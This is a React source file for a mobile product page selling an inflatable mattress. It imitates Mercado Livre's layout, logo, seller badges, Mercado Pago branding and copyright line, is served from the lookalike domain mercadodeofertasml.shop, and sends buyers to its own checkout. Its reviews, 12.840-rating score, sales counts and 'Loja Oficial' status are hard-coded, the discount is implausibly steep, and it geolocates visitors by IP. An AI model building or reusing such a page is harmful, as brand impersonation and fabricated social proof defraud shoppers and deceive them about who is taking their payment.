import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Menu, ShoppingCart, Search, MapPin, Heart, Share2, Star, ThumbsUp, Shield, RotateCcw, Truck, Zap, CreditCard, Package, MoreVertical, CheckCircle, Clock, MessageCircle, Medal } from "lucide-react";

const BASE = "https://mercadodeofertasml.shop/ml/produtos/colchoes/images";

const productImages = [
  `${BASE}/colchao1.png`,
  `${BASE}/colchao2.png`,
  `${BASE}/colchao3.png`,
  `${BASE}/colchao4.png`,
  `${BASE}/colchao5.png`,
];

const detailImages = [
  `${BASE}/detalhe-colchao1.png`,
  `${BASE}/detalhe-colchao2.png`,
  `${BASE}/detalhe-colchao3.png`,
];

const reviews = [
  {
    name: "Thiago Ramos",
    rating: 5,
    date: "a 1 dia atrás",
    text: "O fato de a bomba ser a bateria não ter fio salvou meu acampamento. Enche super rápido e não murchou nada de um dia pro outro.",
    photos: [`${BASE}/avali1.png`],
  },
  {
    name: "Carla Mendes",
    rating: 5,
    date: "a 3 dias atrás",
    text: "Colchão muito alto e confortável, parece cama de verdade. A cor creme é linda e o material de cima é bem gostoso.",
    photos: [`${BASE}/avali3.png`],
  },
  {
    name: "Fernando Alves",
    rating: 4,
    date: "a 1 semana atrás",
    text: "Produto premium, vem com a sacola e os travesseiros de brinde ajudam muito. Recomendo.",
    photos: [`${BASE}/avali6.png`, `${BASE}/avali2.png`],
  },
  {
    name: "Simone Faria",
    rating: 5,
    date: "a 2 semanas atrás",
    text: "Peguei o Queen e coube tranquilo na minha barraca de 4 pessoas. Bomba super silenciosa.",
    photos: [`${BASE}/avali4.png`],
  },
  {
    name: "Joel Dias",
    rating: 5,
    date: "a 1 semana atrás",
    text: "Peguei o Queen, top d+. Bomba enche rapidona.",
    photos: [`${BASE}/avali5.png`],
  },
];

const specs = [
  { label: "Marca", value: "Joyfox" },
  { label: "Modelo", value: "Colchão Inflável Auto Inflável" },
  { label: "Cor", value: "Creme" },
  { label: "Tamanho selecionado", value: "Queen" },
  { label: "Dimensões (C x L x A)", value: "203 cm x 154 cm x 46 cm" },
  { label: "Peso", value: "7,5 kg" },
  { label: "Peso Máximo Suportado", value: "300 kg" },
  { label: "Bomba embutida", value: "Sim, elétrica 12V (sem fio)" },
];

const StarsText = ({ rating }: { rating: number }) => (
  <span className="text-[#3483fa] text-sm tracking-tight">
    {"★".repeat(rating)}{"☆".repeat(5 - rating)}
  </span>
);

const paymentSlides = [
  {
    icon: <CreditCard size={36} className="text-[#3483fa]" />,
    title: "Escolha como pagar",
    desc: "Com Mercado Pago, você paga com cartão, boleto ou Pix.",
    link: "Como pagar com Mercado Pago",
  },
  {
    icon: <Package size={36} className="text-[#3483fa]" />,
    title: "Frete grátis",
    desc: "Benefício em milhares de produtos a partir de R$ 19.",
  },
  {
    icon: <Shield size={36} className="text-[#3483fa]" />,
    title: "Segurança",
    desc: "Queremos que você receba o produto que está esperando.",
  },
];

const PaymentCarousel = () => {
  const [current, setCurrent] = useState(0);
  const [touchX, setTouchX] = useState(0);

  return (
    <div>
      <div className="overflow-hidden">
        <div
          className="flex transition-transform duration-300"
          style={{ transform: `translateX(-${current * 100}%)` }}
        >
          {paymentSlides.map((item, i) => (
            <div key={i} className="min-w-full text-center px-8 py-2"
              onTouchStart={(e) => setTouchX(e.touches[0].clientX)}
              onTouchEnd={(e) => {
                const diff = touchX - e.changedTouches[0].clientX;
                if (diff > 50 && current < paymentSlides.length - 1) setCurrent(current + 1);
                if (diff < -50 && current > 0) setCurrent(current - 1);
              }}
            >
              <div className="flex justify-center mb-3">{item.icon}</div>
              <h3 className="text-[15px] font-semibold text-[#333] mb-1">{item.title}</h3>
              <p className="text-[13px] text-[#999] leading-snug">{item.desc}</p>
              {item.link && (
                <button className="text-[#3483fa] text-[13px] font-medium mt-2">{item.link}</button>
              )}
            </div>
          ))}
        </div>
      </div>
      <div className="flex justify-center gap-[6px] mt-2">
        {paymentSlides.map((_, i) => (
          <button
            key={i}
            onClick={() => setCurrent(i)}
            className={`w-[7px] h-[7px] rounded-full ${i === current ? "bg-[#3483fa]" : "bg-[#ddd]"}`}
          />
        ))}
      </div>
    </div>
  );
};

const BUY_URL = "https://seguro.mercadodeofertasml.shop/api/public/shopify?product=2820731343477&store=28207&utm_source=organic&utm_campaign=&utm_medium=&utm_content=&utm_term=";

const Colchoes = () => {
  const [currentImage, setCurrentImage] = useState(0);
  const [selectedSize, setSelectedSize] = useState("Queen");
  const [isFavorite, setIsFavorite] = useState(false);
  const [touchStart, setTouchStart] = useState(0);
  const [userLocation, setUserLocation] = useState("sua localização");

  useEffect(() => {
    let sid = sessionStorage.getItem("checkout_session_id");
    if (!sid) { sid = crypto.randomUUID(); sessionStorage.setItem("checkout_session_id", sid); }
    supabase.from("checkout_analytics").insert({ session_id: sid, product_key: "colchoes", step_reached: 0, page_visited: "index_colchoes" } as any).then(() => {});
  }, []);

  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        if (data.region && data.country_code) {
          setUserLocation(`${data.city || data.region}, ${data.country_code}`);
        }
      })
      .catch(() => {});
  }, []);

  const handleSwipe = (direction: "left" | "right") => {
    if (direction === "left" && currentImage < productImages.length - 1) {
      setCurrentImage(currentImage + 1);
    } else if (direction === "right" && currentImage > 0) {
      setCurrentImage(currentImage - 1);
    }
  };

  return (
    <div className="min-h-screen bg-[#ededed] pb-24 max-w-[480px] mx-auto">
      {/* Header */}
      <header className="bg-[#ffe600] sticky top-0 z-50">
        <div className="flex items-center justify-between px-3 py-2">
          <Menu size={22} className="text-[#333]" />
          <img
            src="/e7b320f4-9a9c-45e1-8f2e-d116c127d186.png"
            alt="Mercado Livre"
            className="h-[34px]"
            onError={(e) => {
              (e.target as HTMLImageElement).style.display = 'none';
            }}
          />
          <ShoppingCart size={22} className="text-[#333]" />
        </div>
        <div className="px-3 pb-2">
          <div className="flex items-center bg-white rounded-full px-3 py-[7px] shadow-sm">
            <Search size={16} className="text-[#999] mr-2" />
            <span className="text-[#999] text-[14px]">Buscar produtos, muito mais...</span>
          </div>
        </div>
      </header>

      {/* Location bar */}
      <div className="bg-[#ffe600] flex items-center gap-2 px-4 py-2 text-[13px] text-[#333]/60 border-b border-[#eee]">
        <MapPin size={14} />
        <span>Enviar para {userLocation}</span>
      </div>

      <main className="bg-white">
        {/* Brand link */}
        <div className="px-4 pt-3 pb-1">
          <button className="text-[#3483fa] text-[13px]">
            Ir para Loja Oficial Joyfox
          </button>
        </div>

        {/* Product meta */}
        <div className="px-4 pb-1">
          <div className="flex items-center justify-between text-[12px] text-[#999] mb-1.5">
            <span>Novo | +10000 vendidos</span>
            <div className="flex items-center gap-1">
              <span>4.9</span>
              <span className="text-[#3483fa]">★★★★★</span>
              <span className="text-[11px]">(12.840)</span>
            </div>
          </div>
        </div>

        {/* Badges */}
        <div className="px-4 pb-2 flex items-center gap-2">
          <span className="bg-[#f73] text-white text-[10px] font-bold px-2 py-[3px] rounded-[3px] uppercase">
            Mais vendido
          </span>
          <span className="text-[12px] text-[#3483fa]">1º em Colchões Infláveis</span>
        </div>

        {/* Title */}
        <h1 className="px-4 pb-3 text-[15px] font-normal text-[#333] leading-[1.35]">
          Colchão Inflável JoyFox + Bomba Eletrica Bateria Lítio + 2 Travesseiros Joyfox
        </h1>

        {/* Image Carousel */}
        <div
          className="relative bg-white"
          onTouchStart={(e) => setTouchStart(e.touches[0].clientX)}
          onTouchEnd={(e) => {
            const diff = touchStart - e.changedTouches[0].clientX;
            if (Math.abs(diff) > 50) handleSwipe(diff > 0 ? "left" : "right");
          }}
        >
          <div className="relative aspect-square overflow-hidden">
            <img
              src={productImages[currentImage]}
              alt={`Colchão Inflável Joyfox - Imagem ${currentImage + 1}`}
              className="w-full h-full object-contain"
            />
            <div className="absolute top-3 left-3 bg-[rgba(0,0,0,0.55)] text-white text-[11px] px-2 py-0.5 rounded-full">
              {currentImage + 1}/{productImages.length}
            </div>
            <button
              onClick={() => setIsFavorite(!isFavorite)}
              className="absolute top-3 right-3 w-8 h-8 bg-white rounded-full shadow flex items-center justify-center"
            >
              <Heart
                size={18}
                className={isFavorite ? "fill-[#ff5252] text-[#ff5252]" : "text-[#3483fa]"}
              />
            </button>
            <button className="absolute bottom-3 right-3 w-8 h-8 bg-white rounded-full shadow flex items-center justify-center">
              <Share2 size={16} className="text-[#3483fa]" />
            </button>
          </div>
          <div className="flex justify-center gap-[6px] py-3">
            {productImages.map((_, i) => (
              <button
                key={i}
                onClick={() => setCurrentImage(i)}
                className={`w-[7px] h-[7px] rounded-full transition-colors ${
                  i === currentImage ? "bg-[#3483fa]" : "bg-[#ddd]"
                }`}
              />
            ))}
          </div>
        </div>

        {/* Size Selector */}
        <div className="px-4 py-3 border-t border-[#eee]">
          <p className="text-[13px] text-[#666] mb-2">
            Tamanho: <strong className="text-[#333]">{selectedSize}</strong> | Cor: Creme
          </p>
          <div className="flex gap-2">
            {["Solteiro", "Casal", "Queen", "King"].map((s) => (
              <button
                key={s}
                onClick={() => setSelectedSize(s)}
                className={`px-4 py-[7px] rounded-[6px] text-[13px] border transition-colors ${
                  selectedSize === s
                    ? "border-[#3483fa] text-[#3483fa] bg-[#f0f6ff]"
                    : "border-[#ddd] text-[#333]"
                }`}
              >
                {s}
              </button>
            ))}
          </div>
        </div>

        {/* Price */}
        <div className="px-4 py-4">
          <div className="text-[14px] text-[#999] line-through mb-0.5">R$ 599,90</div>
          <div className="flex items-baseline gap-1 mb-0.5">
            <span className="text-[32px] font-light text-[#333] leading-none">
              R$ 139<span className="text-[18px] align-super">90</span>
            </span>
            <span className="text-[13px] text-[#00a650] font-semibold ml-1">58% OFF</span>
          </div>
          <div className="flex items-center text-[14px] mt-1.5">
            <CreditCard size={14} className="text-[#333] mr-1" />
            <span className="text-[#333]">em 10x de </span>
            <span className="text-[#00a650] ml-1">R$ 13,99 sem juros</span>
          </div>
          <button className="text-[#3483fa] text-[13px] mt-1.5">Ver meios de pagamento</button>
        </div>

        {/* Shipping */}
        <div className="px-4 py-3 border-t border-[#eee]">
          <span className="inline-block bg-[#00a650] text-white text-[11px] font-bold px-2 py-[3px] rounded-[3px] mb-2">
            FRETE GRÁTIS
          </span>
          <div className="flex items-center gap-1 text-[14px]">
            <span className="text-[#00a650]">Chegará grátis</span>
            <Zap size={13} className="text-[#00a650] fill-[#00a650]" />
            <span className="text-[#00a650] font-bold text-[12px]">FULL</span>
          </div>
          <p className="text-[13px] text-[#999] mt-0.5">entre sexta-feira e domingo</p>
          <button className="text-[#3483fa] text-[13px] mt-1">Mais detalhes e formas de entrega</button>
        </div>

        {/* Quantity */}
        <div className="mx-4 my-4 bg-[#f5f5f5] rounded-[6px] px-4 py-3 text-[14px] text-[#333]">
          Quantidade: <strong>1 Unidade - {selectedSize}</strong>{" "}
          <span className="text-[#999]">(Disponível)</span>
        </div>

        {/* Buy Button */}
        <div className="px-4 pb-4">
          <a
            href="/checkout?product=colchoes"
            className="block w-full bg-[#3483fa] text-white py-[14px] rounded-[6px] font-semibold text-[16px] text-center no-underline"
          >
            Comprar agora
          </a>
        </div>
      </main>

      {/* Bottom content area */}
      <div className="bg-white mt-2">
        {/* Seller Card */}
        <div className="px-4 py-4">
          <div className="flex items-center gap-3 mb-3">
            <img
              src={`${BASE}/logo_mp.svg`}
              alt="Mercado Pago"
              className="h-[36px]"
            />
            <div>
              <div className="text-[15px] font-bold text-[#333]">Mercado Líder Platinum</div>
              <div className="text-[13px] text-[#999]">Loja Oficial Joyfox</div>
            </div>
          </div>
          {/* Reputation bar */}
          <div className="flex gap-[2px] mb-4">
            <div className="h-[5px] flex-1 rounded-full bg-[#ff9f9f]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#ff9f9f]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#ffe066]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#a8d88e]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#00a650]" />
          </div>
          {/* Stats row */}
          <div className="flex items-start justify-between text-center gap-3">
            <div className="flex-1">
              <div className="text-[22px] font-bold text-[#333]">+100mil</div>
              <div className="text-[11px] text-[#999] leading-tight">Vendas nos últimos 60 dias</div>
            </div>
            <div className="flex-1 flex flex-col items-center">
              <MessageCircle size={20} className="text-[#999] mb-1" />
              <div className="text-[11px] text-[#999] leading-tight">Presta bom atendimento</div>
            </div>
            <div className="flex-1 flex flex-col items-center">
              <Clock size={20} className="text-[#00a650] mb-1" />
              <div className="text-[11px] text-[#999] leading-tight">Entrega os produtos dentro do prazo</div>
            </div>
          </div>
        </div>

        {/* Warranties */}
        <div className="px-4 py-4 border-t border-[#eee] space-y-3">
          <div className="flex items-start gap-3">
            <RotateCcw size={16} className="text-[#3483fa] shrink-0 mt-0.5" />
            <p className="text-[13px] text-[#333]">
              <span className="text-[#3483fa]">Devolução grátis.</span> Você tem 30 dias a partir da data de recebimento.
            </p>
          </div>
          <div className="flex items-start gap-3">
            <Shield size={16} className="text-[#3483fa] shrink-0 mt-0.5" />
            <p className="text-[13px] text-[#333]">
              <span className="text-[#3483fa]">Compra Garantida.</span> Receba o produto que está esperando ou devolvemos o dinheiro.
            </p>
          </div>
          <div className="flex items-start gap-3">
            <Medal size={16} className="text-[#666] shrink-0 mt-0.5" />
            <p className="text-[13px] text-[#333]">12 meses de garantia de fábrica.</p>
          </div>
        </div>
      </div>

      {/* What you need to know */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">
          O que você precisa saber sobre este produto
        </h2>
        <ul className="space-y-1.5 text-[14px] text-[#333] list-disc list-inside">
          <li>Com bomba de ar elétrica embutida (Bateria 4000mAh de Lítio sem fio).</li>
          <li>Inclui 2 almofadas/travesseiros e bolsa de transporte.</li>
          <li>Design flocado resistente à água e a perfurações.</li>
          <li>Inflação automática rápida em apenas 3 minutos.</li>
          <li>Peso máximo suportado: 300 kg (Modelos Queen/King).</li>
          <li>Inclui remendo reparador.</li>
        </ul>
      </div>

      {/* Specs Table */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">Características principais</h2>
        <table className="w-full text-[14px]">
          <tbody>
            {specs.map((spec, i) => (
              <tr key={i} className={i % 2 === 0 ? "bg-[#f9f9f9]" : ""}>
                <td className="py-2.5 px-3 text-[#666] border-b border-[#eee]">{spec.label}</td>
                <td className="py-2.5 px-3 text-[#333] border-b border-[#eee]">{spec.value}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Description */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">Descrição</h2>
        <div className="text-[14px] text-[#333] leading-[1.6] space-y-3">
          <p>
            <strong>Bomba inflável de bateria de lítio recarregável e removível</strong><br />
            Em comparação com outras marcas de colchões de ar no mercado, nosso colchão de ar é equipado com uma bomba inflável de bateria de lítio sem fio de 4000 mAh, para que você possa dizer adeus ao problema de não ter uma fonte de energia, seja para aproveitar o sol no jardim no inverno ou para acampar ao ar livre no verão.
          </p>
          <p>
            <strong>Inflação automática rápida</strong><br />
            O colchão de ar infla em apenas 3 minutos com o toque de um botão. A bomba de ar integrada proporciona uma operação mais silenciosa e sem complicações. A bolsa de transporte incluída facilita o armazenamento e o transporte.
          </p>
          <p>
            <strong>Durável, à prova d'água e termorregulado</strong><br />
            O colchão de ar é feito de cloreto de polivinila durável com uma parte superior flocada à prova d'água. Nossa tecnologia multicamadas também é resistente a perfurações e ajuda a regular a temperatura do corpo para uma respirabilidade ideal.
          </p>
          <p>
            <strong>Base antiderrapante com tecnologia respirável</strong><br />
            O design patenteado da base estabilizadora com ventosas evita que o colchão escorregue ou deslize acidentalmente.
          </p>
          <p>
            <strong>Máximo conforto e estabilidade</strong><br />
            A estrutura da superfície alivia vários pontos de pressão e oferece suporte personalizado e uma experiência de sono com gravidade zero. Qualquer lençol do tamanho correspondente pode ser usado.
          </p>
          <p>
            <strong>Lista de produtos:</strong><br />
            1* Colchão inflável<br />
            1* Bomba de ar com bateria de lítio integrada<br />
            3* Bicos cônicos de tamanhos diferentes<br />
            1* Bolsa de armazenamento<br />
            2* Travesseiros infláveis<br />
            1* Kit de reparo<br />
            1* Cabo de carregamento USB<br />
            1* Manual de instruções
          </p>
          <p className="italic text-[#666]">
            Atenção: A dimensão, peso e capacidade de carga do produto variam de acordo com o tamanho selecionado (Solteiro, Casal, Queen ou King). Verifique as especificações exatas na ficha técnica acima.
          </p>
        </div>
        {/* Detail Images */}
        <div className="mt-4 space-y-0">
          {detailImages.map((img, i) => (
            <img key={i} src={img} alt={`Detalhes do colchão ${i + 1}`} className="w-full" />
          ))}
        </div>
      </div>

      {/* Reviews */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">Opiniões do produto</h2>
        <div className="flex items-center gap-2 mb-4">
          <span className="text-[36px] font-light text-[#333]">4.9</span>
          <div>
            <div className="text-[#3483fa] text-[18px] tracking-tight">★★★★★</div>
            <span className="text-[12px] text-[#999]">(12.840 avaliações)</span>
          </div>
        </div>

        <div className="space-y-0">
          {reviews.map((review, i) => (
            <div key={i} className="border-t border-[#eee] py-4">
              <div className="flex items-center gap-1.5 mb-1">
                <span className="text-[13px] text-[#333] font-medium">{review.name}</span>
                <CheckCircle size={12} className="text-[#3483fa]" />
              </div>
              <div className="flex items-center gap-2 mb-2">
                <StarsText rating={review.rating} />
                <span className="text-[11px] text-[#999]">{review.date}</span>
              </div>
              <p className="text-[13px] text-[#333] leading-[1.5] mb-2">{review.text}</p>
              {review.photos.length > 0 && (
                <div className="flex gap-2 mb-2 overflow-x-auto">
                  {review.photos.map((photo, j) => (
                    <img
                      key={j}
                      src={photo}
                      alt="Foto da avaliação"
                      className="w-[80px] h-[80px] object-cover rounded-[4px] shrink-0"
                    />
                  ))}
                </div>
              )}
              <div className="flex items-center justify-between">
                <button className="flex items-center gap-1.5 text-[12px] text-[#999] border border-[#ddd] rounded-full px-3 py-1">
                  É útil <ThumbsUp size={12} />
                </button>
                <MoreVertical size={16} className="text-[#999]" />
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Payment Methods Carousel */}
      <div className="bg-white mt-2 py-5">
        <PaymentCarousel />
      </div>

      {/* Footer Links */}
      <div className="bg-white mt-2 px-4 py-4 text-center">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[13px] text-[#666] mb-3">
          <span>Minha conta</span>
          <span>Compras</span>
          <span>Histórico</span>
          <span>Favoritos</span>
          <span>Categorias</span>
          <span>Ofertas do dia</span>
          <span>Vender</span>
          <span>Contato</span>
        </div>
        <div className="text-[11px] text-[#999] space-y-1">
          <p>Termos e condições · Privacidade · Acessibilidade</p>
          <p>Copyright © 1999-2024 Ebazar.com.br LTDA.</p>
        </div>
      </div>

      {/* Sticky Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-[#eee] px-4 py-3 z-50 max-w-[480px] mx-auto">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-[15px] font-semibold text-[#333]">R$ 139,90</p>
            <p className="text-[12px] text-[#333]">10x R$ 13,99 sem juros</p>
            <p className="text-[13px] text-[#333] font-extrabold">1 Unidade - {selectedSize}</p>
          </div>
          <a
            href="/checkout?product=colchoes"
            className="bg-[#3483fa] text-white px-6 py-2.5 rounded-[6px] font-semibold text-[14px] no-underline"
          >
            Comprar agora
          </a>
        </div>
      </div>
    </div>
  );
};

export default Colchoes;
